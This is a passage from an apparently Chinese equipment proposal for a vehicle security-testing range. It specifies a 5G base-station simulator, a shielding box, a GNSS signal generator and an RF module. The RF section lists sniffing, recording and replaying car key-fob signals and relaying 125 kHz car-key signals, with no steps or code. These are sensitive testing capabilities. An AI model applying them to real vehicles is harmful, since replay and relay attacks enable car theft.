data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/09740419a12c571a32e24d9ea9e411f9.png"></p><p>图2-9</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/94b76d0dfbea6b77def93fc2ea4689d0.png" alt="IMG_256"></p><p>图2-10</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ad2702b0df7cf1eced87cf3eb0564748.png" alt="IMG_256"></p><p>图2-11</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2cc19639ab97da1f38172de72d2fbf2d.png" alt="IMG_256"></p><p>图2-12</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5da66c70f79ffe886164885144d9c9eb.png" alt="IMG_256"></p><p>图2-13</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7fa6df0bf0718ca96f86ab506a92a05b.png" alt="IMG_256"></p><p>图2-14</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5afac4c3c764b2eaad291e2a2b106302.png" alt="IMG_256"></p><p>图2-15</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9e19df424d0698f6c774858703e2e1f0.png" alt="IMG_256"></p><p>图2-16</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/100fbfbe63306a2da522a38f7a179750.png" alt="IMG_256"></p><p>图2-17</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a8a348f461a9b12688ddea0228c8dadf.png"></p><p>图2-18</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e7a5be7ffc584a9ff591119c151bee8e.png"></p><p>图2-19</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/78ba3f64a0c1705ad5ffc542deb3344f.png"></p><p>图2-20</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/28a341bc901434494d3b74fc432848fa.png"></p><p>图2-21</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7ee7c88ce7f4b760ae2ffc6254814bdb.png"></p><p>图2-22</p><h4 id="LTE-5G接入模块"><a href="#LTE-5G接入模块" class="headerlink" title="LTE-5G接入模块"></a>LTE-5G接入模块</h4><h5 id="功能实施方案-15"><a href="#功能实施方案-15" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>模拟基站提供全面的4G和5G网络服务。这一能力使得模块不仅能够支持当前广泛使用的4G网络，还能够兼容新一代的5G网络，确保了模块的长期适用性和前瞻性。此外，该模块具备捕获网络流量的能力，可以截获经过的IP数据包。这一特性对于网络工程师和系统管理员来说至关重要，因为它们可以利用流行的网络协议分析工具Wireshark来深入分析这些数据包。通过Wireshark来分析IP数据包，可以诊断网络问题，优化性能，确保数据传输的安全性，并且对网络通信过程有一个清晰的可视化理解；详见产品手册中图3-1</li><li>LTE具备最高支持8CC聚合的能力，它可以同时利用多达8个载波频段，以提供更广泛的频谱利用率和更高的数据传输速率。结合4x4 MIMO技术，模块能够通过四个独立的发送和接收天线链路，进一步增强信号的质量和吞吐量；详见产品手册中图3-2</li><li>支持5G NR的网络部署方面。该模块不仅支持非独立组网(NSA)模式，允许5G网络在现有的LTE基础设施上运行，实现平滑过渡和快速部署，同时也支持独立组网(SA)模式，为未来纯5G网络环境提供了完备的支持。这种双模支持确保了模块能够适应不同的网络演进策略和运营商需求，从而在全球范围内实现广泛的兼容性和部署灵活性。此外，该模块还具备强大的射频测试功能，覆盖LTE、NR NSA和NR SA模式，能够进行全面的射频性能评估。它不仅能够执行3GPP标准所规定的单表测试TX用例和RX用例，还能够图形化显示测试结果。图形化结果展示包括误差矢量幅度(EVM)解调星座图，这是评估调制质量的关键指标，以及每个符号的EVM测试结果，为工程师提供了直观的性能指标，以便于分析和优化。这些高级测试功能不仅提高了测试效率，同时也使得故障诊断和性能调优更为直观和便捷，极大地提升了运维人员在复杂网络环境中的工作效率；选件信息见“方案”</li><li>5G NR通信标准的实施方面,支持TDD（Time Division Duplexing）和FDD（Frequency Division Duplexing）两种双工技术的能力，确保了其在全球不同的网络环境和频谱资源配置中的应用灵活性；详见产品手册中图3-3</li><li>支持3GPP TS 38.521的射频测试全部规范，这一点体现了模块在确保与最新通信技术兼容性方面的能力。3GPP TS 38.521是定义5G NR设备射频特性和性能要求的关键技术标准，涵盖了从基本的频率和功率测量到更复杂的调制和信号质量评估等一系列射频测试；详见产品手册中图3-4</li><li>内置应用测试服务器支持多种网络测试协议和服务，而且能够执行包括支持Volte，Iperf, FTP，5G 应用层/IP层吞吐量测试。这对于理解和优化网络在处理高速数据流时的能力极为重要；详见产品手册中图3-5</li><li>具备通过软硬件升级来支持毫米波（mmWave）通信功能的能力。这一灵活性确保了模块能够适应快速变化的5G技术标准和市场需求。在进行相应的升级之后，模块将能够支持包括28GHz和39GHz在内的关键毫米波频率，这两个频段在高速5G通信中扮演着至关重要的角色。更进一步，升级后的模块还能够兼容44GHz至50GHz之间的n262频段，这为测试和验证在这一更高频率范围内运行的5G设备提供了可能；详见产品手册中图3-6</li><li>支持双基带（双模）功能，这意味着该模块能够同时处理两种不同的信号基带数据流，从而实现对多种无线通信标准的支持；详见产品手册中图3-7</li><li>MIMO&amp;CA能力的融合是实现高速数据传输和网络效率的关键技术。对于LTE网络，该模块提供了8CC 4x4 MIMO的支持，它可以同时聚合多达8个载波，每个载波使用4x4 MIMO技术，这极大地增强了信号的传输能力和网络的吞吐量。在5G NR（新无线）方面，模块同样表现出色，支持高达4CC 4x4 MIMO的配置，允许四个载波的聚合，每个载波也采用4x4 MIMO技术，从而确保了在5G网络下的高速数据传输和优异的连接稳定性；详见产品手册中图3-8</li></ol><h5 id="性能实施方案-3"><a href="#性能实施方案-3" class="headerlink" title="性能实施方案"></a>性能实施方案</h5><ol><li>模块能够操作在400MHz至8GHz的宽频率范围内，它可以支持从较低的次一代无线服务频段到高达毫米波频段的多种频谱。此外，射频通道的带宽高达1GHz，这为数据密集型应用提供了巨大的数据吞吐量，使得模块能够轻松处理高分辨率视频流、大规模的互联网数据交换以及其他宽带宽应用，同时保持了低延迟和高可靠性；详见产品手册中图3-9</li><li>模块拥有8个射频通道，它能同时处理8路独立的信号，快速处理多种信号的同时输入；详见产品手册中图3-10</li><li>模块达到0.1Hz的频率精度，这种高精度保证了无线信号可以被准确地调谐和锁定，从而最大限度地减少干扰和提高信号的质量。接收机的显示平均噪声水平（DANL）低于–150 dBm（以1Hz为带宽计）。这一要求意味着接收机需要具备极高的灵敏度，能够检测到极其微弱的信号，这对于在低信号区域保持通信质量非常关键。详见产品手册中图3-11</li></ol><h5 id="技术实现内容-13"><a href="#技术实现内容-13" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-2"><a href="#方案-2" class="headerlink" title="方案"></a>方案</h6><p>LTE5G接入模块选用罗德与施瓦茨（中国）科技有限公司产品，LTE5G接入模块是一种用于手机、平板电脑、移动路由器等无线设备连接5G网络的模块。它是一种嵌入式模块，通常由芯片、射频前端、天线、软件等组成。</p><p>LTE5G接入模块通常具有以下特点和功能：</p><p>1. 高速数据传输：LTE5G接入模块支持5G网络的高速数据传输，可以达到几千兆位每秒的数据传输速度，提供更快的上网体验。</p><p>2. 低时延：LTE5G接入模块支持低时延的数据传输，可以实现更快的网络速度和更高的实时性。</p><p>3. 多频段支持：LTE5G接入模块支持多种5G频段，以适应不同地区和运营商的网络需求。</p><p>4. 多模式支持：LTE5G接入模块通常支持多种网络制式，如5G、LTE、GSM、UMTS等，以确保设备在不同网络环境下的通信能力。</p><p>5. 多天线支持：LTE5G接入模块通常支持多个天线接口，以提高信号接收和发送的质量和稳定性。</p><p>6. 小型化和低功耗：LTE5G接入模块通常采用小型化设计和低功耗技术，以适应移动设备的特点，延长设备的电池寿命。</p><p>7. 兼容性强：LTE5G接入模块通常具有良好的兼容性，可以与各种操作系统和开发平台配合使用，方便开发和应用。</p><p>通过使用LTE5G接入模块，可以实现无线设备与5G网络的连接，提供高速数据传输、低时延和多模式支持，为设备的上网和通信提供更加稳定和可靠的接入方式。</p><p>支持5G NR的 NSA和SA两种组网方式，支持LTE、NR NSA和NR SA模式下的射频测试能力，提供3GPP要求的单表测试TX用例和RX用例，并支持图形化显示测试结果，包括EVM解调星座图和每个符号的EVM测试结果。</p><p>CMX500是一款功能强大的通用无线通信测试仪器，它支持5G NR的NSA（非独立组网）和SA（独立组网）两种组网方式，并提供LTE、NR NSA和NR SA模式下的射频测试能力。以下是对其相关功能的详细描述：</p><ol><li>5G NR NSA和SA支持：</li></ol><p>CMX500支持5G NR的NSA和SA两种组网方式，可以进行相关测试和分析。NSA模式下，5G NR与现有LTE网络协同工作；SA模式下，5G NR独立组网。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5f17dbc796d1db73ad3c05dc6b475ab1.png" alt="IMG_256"></p><ol><li>射频测试能力：</li></ol><p>CMX500提供LTE、NR NSA和NR SA模式下的射频测试能力，可以测试和分析无线信号的性能和质量。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/30a923e5bd9f0d962d111c6e843e6453.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f1ea7a70f821c511915a339bcff83d3c.png" alt="IMG_256"></p><ol><li>3GPP要求的单表测试用例：</li><li>CMX500符合3GPP（第三代合作伙伴计划）的要求，提供了单表测试用例，用于评估和验证设备在不同测试场景下的性能。TX（发送端）用例和RX（接收端）用例：CMX500支持3GPP要求的TX用例和RX用例，用于测试设备在发送和接收无线信号时的性能和准确性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2442f48941ed4104da3443ff84bc157e.png" alt="IMG_256"></p><ol><li>图形化显示测试结果：</li></ol><p>CMX500可以将测试结果以图形化的方式显示，方便用户直观地了解测试结果。</p><ol><li><p>EVM（误差向量幅度）解调星座图：CMW500可以显示解调星座图，用于评估信号的调制质量和误差。</p></li><li><p>每个符号的EVM测试结果：CMW500可以显示每个符号的EVM测试结果，用于评估信号的每个符号的调制质量和误差。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dfbead5172e82a845210ddbb462ce4a2.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2eb14858834a9727fdd8be4f6dfd7abb.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5620cd66a4f7ff375c3702dc8c48f4cb.png" alt="IMG_256"></p></li></ol><h6 id="产品手册切图"><a href="#产品手册切图" class="headerlink" title="产品手册切图"></a>产品手册切图</h6><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/257794850f766f1c772bf3e5a7629e58.png" alt="IMG_256"></p><p>图3-1</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5f7b1e12063e434fbc42c984560400d0.png" alt="IMG_256"></p><p>图3-2</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7f019c72b61da3e98061ecd68f5f1b33.png"></p><p>图3-3</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c7bf63eb386777d00643f446577063ed.png"></p><p>图3-4</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4b1bbeec7a24f694ba0e0105d638d9b9.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/90c289f30bb29e620df059be2192d33c.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fd9bc0e6949c198a178842381868e4df.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7bf00bead335ffc257bc87ffba0659b3.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/95ccb345859a1a3ab20d81c173007207.png" alt="IMG_256"></p><p>图3-5</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1239196eff92626e79ab92a6b450df0b.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6e7635a9d15d6e255efbcee692971dd7.png" alt="IMG_256"></p><p>图3-6</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/05131fbcf9aec2bb9b63920d54c685ff.png"></p><p>图3-7</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d8d13a406b44d6f0bc63bf6ddab53abe.png"></p><p>图3-8</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e6295fbc912cb05a1be9a5db0f5520ca.png"></p><p>图3-9</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3fc67be52f4564dff13953f7500beb4b.png"></p><p>图3-10</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/14bcc219366def730d77605f94b059a2.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/98dc28ed041564c5363926ada9cd2ae6.png" alt="IMG_256"></p><p>图3-11</p><h4 id="信号屏蔽箱"><a href="#信号屏蔽箱" class="headerlink" title="信号屏蔽箱"></a>信号屏蔽箱</h4><h5 id="功能实施方案-16"><a href="#功能实施方案-16" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>能够有效地屏蔽无线信号、阻断外部无线信号的干扰，确保了测试设备不受外部信号波动的影响；</li><li>配备了专业的射频接头，具体为N-SMA或N-N型号，这些接头的数量为6个。这些射频接头是为了确保设备能够在屏蔽箱内部安全地连接射频源或测试设备，而不会影响屏蔽效果；</li><li>大型屏蔽箱的内部尺寸被设定为800毫米（长）乘以850毫米（宽）乘以1800毫米（高），这一尺寸规格（宽 x 高 x 深）为测试提供了宽敞的空间，使其能够适应从小型手持设备到较大的通信设备的测试需求；</li><li>提供以太网接口*1的屏蔽箱的高度适应性和互连性使其成为能够满足复杂网络测试需求的高效工具；</li><li>提供USB接口*1极大地扩展了屏蔽箱的应用范围；</li><li>配备5.5mm直流电源接口*1，可以满足更广泛的用电需求。</li></ol><h5 id="性能实施方案-4"><a href="#性能实施方案-4" class="headerlink" title="性能实施方案"></a>性能实施方案</h5><ol><li>在800Mhz至10Ghz的频率范围内，屏蔽系数达到60dB，确保了信号屏蔽箱能够有效地阻断从低端的移动通信频段到高端的微波频段之间的广泛电磁波谱。</li></ol><h5 id="技术实现内容-14"><a href="#技术实现内容-14" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-3"><a href="#方案-3" class="headerlink" title="方案"></a>方案</h6><p>信号屏蔽箱，也被称为信号阻断箱或信号屏蔽器，是一种用于屏蔽无线信号的设备。它通过设计特殊的金属外壳或材料，有效地阻断无线信号的传输和接收，从而达到屏蔽周围环境中的无线通信信号的目的。</p><p>信号屏蔽箱通常用于以下场景：</p><p>1. 安全需求：在某些场合，需要屏蔽无线信号以保护机密信息的安全性，例如政府机构、军事基地、研究实验室等。</p><p>2. 防干扰需求：在某些场合，需要屏蔽无线信号以避免对其他设备产生干扰，例如医疗设备、电子测试设备、航空电子设备等。</p><p>信号屏蔽箱的工作原理是通过其外壳或材料具有良好的电磁屏蔽性能，能够有效地阻隔无线信号的传输和接收。这些外壳或材料铜金属，能够反射和吸收无线信号，使其无法穿透到屏蔽箱内部或从箱体内部透出。</p><h4 id="移动平台"><a href="#移动平台" class="headerlink" title="移动平台"></a>移动平台</h4><h5 id="功能实施方案-17"><a href="#功能实施方案-17" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>遵循800mm（长）*600mm（宽）*900mm（高）的尺寸标准。这一外观尺寸设计不仅确保了平台具有足够的空间来容纳必要的设备和工具，而且也使得它能够轻松适应多种工作环境；</li><li>板材具有1.2mm的厚度。不仅保证了平台的整体结构强度和耐用性，以承受日常使用中可能遇到的各种负载和冲击，同时也保持了平台的轻便性，确保其移动性不受过重的结构材料影响；</li><li>240KG的承重能力意味着平台在设计和制造时采用了高强度材料和结构优化，以确保即使在满载状态下，也能保持结构的完整性和操作的安全性；</li><li>采用了防静电皮作为覆盖层。这种材料的选用至关重要，因为它有效地防止了静电的积聚和意外放电，这对于保护敏感的测试设备与精密元器件至关重要；</li><li>直径为25mm的立柱，该尺寸不仅为平台提供了坚固的支撑，确保了在移动或承载重物时的结构完整性，而且也优化了整体重量，使得平台既稳固又便于操控；</li><li>配备了4个带锁止功能的万向轮。这种轮子的配置允许用户轻松推动平台到所需的位置，而其万向性质确保了在任何方向上都能够得到顺畅的移动体验。</li></ol><h5 id="技术实现内容-15"><a href="#技术实现内容-15" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-4"><a href="#方案-4" class="headerlink" title="方案"></a>方案</h6><p>本方案测试工具移动平台是用于放置测试工具的一个移动桌面，桌面台面铺设防静电皮以保证测试设备与元器件的安全，桌子配置4个带锁的万向轮，可方便工具的移动，方便测试人员开展测试工作。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/97a47849dc678bdd507a0da7f5142880.png"></p><h4 id="GNSS接入模块"><a href="#GNSS接入模块" class="headerlink" title="GNSS接入模块"></a>GNSS接入模块</h4><h5 id="功能实施方案-18"><a href="#功能实施方案-18" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>支持北斗频段信号发生，北斗系统作为一个全球卫星导航系统，提供了与美国GPS系统相竞争的定位、导航、授时服务，其覆盖范围不断扩大，精度不断提高；</li><li>支持GPS频段信号发生，GPS作为全球定位系统的先驱，其信号被广泛应用于各种导航和定位设备中；</li><li>支持GLONASS频段信号发生，GLONASS，即全球导航卫星系统，是由俄罗斯开发的卫星导航系统，与美国的GPS系统相似，它提供了全球范围内的定位服务；</li><li>支持Galileo频段信号发生，Galileo系统是欧盟开发的全球卫星导航系统，旨在为全球用户提供高精度的定位和计时服务；</li><li>管理与使用权分配功能，该功能允许在靶场系统启用前的初始化配置阶段对设备进行详细的配置管理，确保每个组件和服务都经过精确设定，满足特定的测试需求和标准。一旦靶场系统投入使用，这个强大的功能进一步允许用户将设备的使用权灵活分配给不同的靶场测试环境，从而实现资源的最优化利用。这种分配机制不仅提高了设备的使用效率，还允许多个测试场景在同一时间段内并行运行，而不会相互干扰；</li></ol><h5 id="性能实施方案-5"><a href="#性能实施方案-5" class="headerlink" title="性能实施方案"></a>性能实施方案</h5><ol><li>支持介于8kHz至3GHz或者可扩展至6GHz的频率范围，这一宽频覆盖使得模块能够适配多种通信标准和频段，为不同的测试和操作环境提供灵活性；</li><li>具备较高的输出功率，达到+33dBm，这样的功率水平保证了信号可以在较远距离传输，同时保持良好的信号质量，即使在高需求的应用中也不会出现功率不足的问题；</li><li>支持高达1GHz的调制带宽，这一特性使得模块能够处理宽带通信，适应高速数据传输的需要，同时也意味着能够支持最新的高速无线通信技术，包括但不限于先进的卫星通信协议。</li></ol><h5 id="技术实现内容-16"><a href="#技术实现内容-16" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-5"><a href="#方案-5" class="headerlink" title="方案"></a>方案</h6><p>GNSS（全球导航卫星系统）接入模块是一种用于接收和处理全球定位系统（GPS）、伽利略系统（Galileo）、格洛纳斯系统（GLONASS）或其他卫星导航系统信号的设备。它通常用于移动设备、车辆导航系统、无人机、船舶和其他需要定位和导航功能的应用中。</p><p>GNSS接入模块的主要功能是接收卫星发射的导航信号，并计算出设备的位置、速度和时间信息，频率范围介于8kHz至3GHz或6GHz、输出功率+33dBm、1GHz调制带宽，支持北斗、GPS、GLONASS、Galileo卫星型号频段。</p><p>它由以下几个组件组成：</p><p>1. 天线：用于接收卫星信号的天线，通常是一个小型的陶瓷或金属天线。</p><p>2. 接收机：接收机负责接收天线接收到的信号，并进行信号处理和解码。它将接收到的信号转换为数字信号，并提供给后续的计算单元进行位置计算。</p><p>3. 计算单元：计算单元是GNSS接入模块的核心部分，它使用接收到的卫星信号进行位置计算。计算单元通常由处理器、存储器和算法组成，可以进行复杂的信号处理和定位算法运算。</p><p>4. 接口：GNSS接入模块通常提供多种接口，以便与其他设备进行通信。常见的接口包括串行接口（如UART）、USB、SPI和I2C等。</p><p>GNSS接入模块的工作原理是通过接收多颗卫星发射的信号，并利用三角测量原理计算设备的位置。接收到的卫星信号包含了卫星的位置和时间信息，通过同时接收多颗卫星的信号，并利用这些信息进行计算，可以确定设备的精确位置。</p><p>在初始化配置阶段，用户需要对GNSS模块进行配置管理。这包括设置GNSS模块的参数、协议、频率等以满足特定的靶场测试需求。在靶场系统投入使用后，用户可以根据需要将设备的使用权分配给不同的靶场测试环境。</p><p>可用于管理与使用权分配功能，在靶场系统启用前的初始化配置阶段对设备进行配置管理，在靶场投入使用后用户可以分配设备的使用权给不同的靶场测试环境。</p><h6 id="产品手册-1"><a href="#产品手册-1" class="headerlink" title="产品手册"></a>产品手册</h6><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a15d1a14773d6b75167befa39e5270ba.jpeg" alt="矢量信号发生器SMBV100B_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/baa2b22a8f1e6ed2290faa7faefc6626.jpeg" alt="矢量信号发生器SMBV100B_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7e5315358e8386ee493a1f5936a02ecf.jpeg" alt="矢量信号发生器SMBV100B_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2f2b5d5f7f6de3bfab908ab47db1c09d.jpeg" alt="矢量信号发生器SMBV100B_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/945d2c517eb0190dc0875b7d16a11cd6.jpeg" alt="矢量信号发生器SMBV100B_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/89ed9b8f249d64c67db48e15a748390a.jpeg" alt="矢量信号发生器SMBV100B_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/15f70ba52aa095a12862c0f436962374.jpeg" alt="矢量信号发生器SMBV100B_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/76170dd77847e32bb3423007d24930ca.jpeg" alt="矢量信号发生器SMBV100B_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/159dc7425d49b992d0077448628bb528.jpeg" alt="矢量信号发生器SMBV100B_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/81313bd6b83464f515c62c09d3b26606.jpeg" alt="矢量信号发生器SMBV100B_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/07392bb5678e2ffe3244fe6a6a4c5b91.jpeg" alt="矢量信号发生器SMBV100B_10"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0f3aa80c79f79c040062dcca1a30b0da.jpeg" alt="矢量信号发生器SMBV100B_11"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e05cca7cd803e37bcc1937ad22562f6b.jpeg" alt="矢量信号发生器SMBV100B_12"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a73867bbd86e2f8c5083aff598b3de4e.jpeg" alt="矢量信号发生器SMBV100B_13"></p><h4 id="射频及无线电接入模块"><a href="#射频及无线电接入模块" class="headerlink" title="射频及无线电接入模块"></a>射频及无线电接入模块</h4><h5 id="功能实施方案-19"><a href="#功能实施方案-19" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>提供包括315MHz、433MHz、868MHz、915MHz等在内的频段信号接入，这些频率是车辆遥控系统、无线钥匙、防盗系统以及车载传感器网络中广泛使用的标准频段；</li><li>不仅能够接入包括315MHz、433MHz、868MHz、915MHz等频段的信号，而且能够对这些信号进行详尽的监测和捕获（嗅探），将其存储下来（录制），以及在需要时精确地重新发送（重放）；</li><li>提供汽车钥匙125K低频信号的中继功能，中继功能可以使模块能够接收来自汽车钥匙的125KHz信号，并能够无损地转发这一信号；</li><li>与配套台架的绑定使用权限机制。这一机制确保在靶场系统启用之前，模块在初始化配置阶段就能够通过严格的权限控制进行配置管理。这样的设计允许系统管理员在靶场系统开始运作之前，对设备进行必要的设置和授权，确保只有经过授权的用户才能够配置和使用该模块。当靶场正式投入使用后，模块将能够在特定的台架或车型测试环境中根据授权进行配置和使用。这不仅提高了测试环境的安全性，也增强了操作的灵活性；</li><li>内置上位机，该上位机配备了Intel第10代4核心i5处理器，确保了模块的处理能力可以轻松应对各种复杂的数据处理任务。此外，上位机搭载了8GB的内存，提供了充足的运行空间，以便于同时执行多个操作，包括信号解码、数据分析和复杂算法的运算，而不会出现延迟或卡顿的问题。至于存储方面，模块内置了250GB的固态硬盘（SSD），这不仅提供了快速的数据读写速度，确保了数据处理的高效性，而且提供了足够的存储空间，用于存储大量的信号录制文件和日志数据。</li></ol><h5 id="技术实现内容-17"><a href="#技术实现内容-17" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-6"><a href="#方案-6" class="headerlink" title="方案"></a>方案</h6><p>射频（Radio Frequency）和无线电接入模块是用于接收和发送无线电信号的设备。它们在无线通信、无线数据传输和无线控制系统中起着重要的作用。这些模块通常包括射频收发器、天线、接收机和发送机等组件。</p><p>射频接收模块的主要功能是接收来自外部的无线电信号，并将其转换为可处理的基带信号。它通常包括以下组件：</p><p>1. 天线：用于接收无线电信号的天线。天线的设计和性能对接收信号的质量和范围有着重要影响。</p><p>2. 射频收发器：射频收发器负责接收天线接收到的信号，并进行射频信号的放大、滤波和混频等处理。它将射频信号转换为中频信号或基带信号，以供后续处理。</p><p>3. 接收机：接收机进一步处理中频信号或基带信号，进行信号解调、滤波和解码等操作。它将接收到的信号转换为数字信号，以供后续的数字处理单元进行处理。</p><p>射频发送模块的主要功能是将数字信号转换为无线电信号，并通过天线发送出去。它通常包括以下组件：</p><p>1. 数字处理单元：数字处理单元接收来自其他设备或系统的数字信号，并进行调制、编码和滤波等处理，将数字信号转换为模拟信号。</p><p>2. 